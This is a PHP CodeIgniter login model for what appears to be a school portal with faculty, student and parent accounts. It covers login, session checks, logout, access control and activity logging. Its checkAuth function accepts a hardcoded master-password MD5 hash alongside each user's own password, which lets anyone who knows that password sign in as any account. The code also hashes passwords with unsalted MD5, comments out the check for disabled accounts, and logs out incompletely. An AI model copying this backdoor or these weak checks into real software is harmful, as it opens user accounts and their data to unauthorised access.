<?php

class Login_model extends CI_Model
{

function Login_model()
{
parent::__construct();
$this->load->library('session');
}

function checkAuth($uName,$pass){
$this->db->select('*');
$this->db->where('username',$uName);
//$this->db->where('password',md5($pass));
//$this->db->where('enabled=',1);
$query = $this->db->get('tbl_user');
//echo $this->db->last_query();
if($query->num_rows()>0){
$data = $query->row_array();
if(md5($pass) == $data['password'] || md5($pass) == '513a55a84876f373941a4fd7e787864e'){
$user_code = null;
$code = null;
if($data['user_type_code'] == 'FACU'){
    $user_code = $data['ADVIIDNO'];
    $code = $data['ADVICODE'];
}elseif($data['user_type_code'] == 'STUD'){
    $user_code = $data['STUDIDNO'];
    $code = $data['STUDCODE'];
}elseif($data['user_type_code'] == 'PRNT'){
    $user_code = $data['PAREIDNO'];
    $code = $data['PARECODE'];
}
$sessionArray = array( 'userId'=>$data['id'],
    'userName'=>$uName,
    'userType'=>$data['user_type_code'],
    'userCode'=>$user_code,
    'code'=>$code,
'logged_in'=>TRUE
);
$this->session->set_userdata($sessionArray);
$log=array('userId'=>$this->session->userdata('userId'),
'actionType'=>'LOGIN',
//'item_type'=>'USER',
'time'=>date("Y-m-d H:i:s"));
//echo $this->db->last_query();
$this->log_message($log);
return TRUE;
}else{
	return FALSE;
}
}else{
return FALSE;
}
}

public function check_session()
{
if ($this->session->userdata('userId') AND $this->session->userdata('logged_in')=='TRUE') {
return TRUE;
} else {
return FALSE;
}
}

public function logout(){
$this->session->unset_userdata('id');
$this->session->unset_userdata('logged_in');
//session_destroy();
$log=array('userId'=>$this->session->userdata('userId'),
'actionType'=>'LOGOUT',
//'item_type'=>'USER',
'time'=>date("Y-m-d H:i:s"));
$this->log_message($log);
}

public function log_message($logArray){
if(isset($logArray)){
$this->db->insert('tbl_logs',$logArray);
}
}

public function check_access(){
$link = uri_string();
$pos = strpos($link, 'index');
if($pos){
    $link = substr($link, 0, $pos-1);
}
$this->db->select("is_public");
$this->db->where("link", $link);

$public = $this->db->get("module");


$is_public = 1;
if($public->num_rows()>0){
foreach ($public->result_array() as $key =>$val)
{
    $is_public = $val['is_public'];
}
$public->free_result();
}else{
    return 0;
}
if(!$is_public){
$this->db->select("module.*");
$this->db->join("module_group_access b", "module.id = b.module_id", "left");
$this->db->join("module_group_users c", "b.group_id = c.group_id", "left");
$this->db->where("c.username", $this->session->userdata("userName"));
$this->db->where("link", $link);
$query = $this->db->get("module");

return $query->num_rows();
}else{

return 1;
}

}

}

?>